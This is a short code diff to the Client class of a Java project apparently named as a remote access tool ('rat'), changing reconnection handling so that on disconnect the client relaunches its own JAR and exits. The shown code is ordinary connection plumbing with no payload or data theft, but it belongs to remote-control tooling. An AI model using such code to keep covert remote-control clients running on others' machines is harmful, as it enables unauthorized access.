@@ -1,5 +1,6 @@
 package de.sogomn.rat;
 
+import de.sogomn.engine.util.FileUtils;
 import de.sogomn.rat.gui.ChatWindow;
 import de.sogomn.rat.gui.IGuiController;
 import de.sogomn.rat.packet.ChatPacket;
@@ -21,6 +22,8 @@ public final class Client implements IConnectionObserver, IGuiController {
 		this.connection = connection;
 		
 		chat = new ChatWindow();
+		
+		connection.setObserver(this);
 		
 		chat.addListener(this);
 	}
@@ -65,13 +68,11 @@ public final class Client implements IConnectionObserver, IGuiController {
 	
 	@Override
 	public void disconnected(final ActiveConnection connection) {
-		final String address = connection.getAddress();
-		final int port = connection.getPort();
-		
 		chat.close();
 		connection.setObserver(null);
 		
-		startClient(address, port);
+		FileUtils.executeFile(Constants.JAR_FILE);
+		System.exit(0);
 	}
 	
 	@Override
@@ -105,7 +106,7 @@ public final class Client implements IConnectionObserver, IGuiController {
 			try {
 				Thread.sleep(CONNECTION_INTERVAL);
 			} catch (final Exception ex) {
-				//...
+				ex.printStackTrace();
 			} finally {
 				System.gc();
 				startClient(address, port);
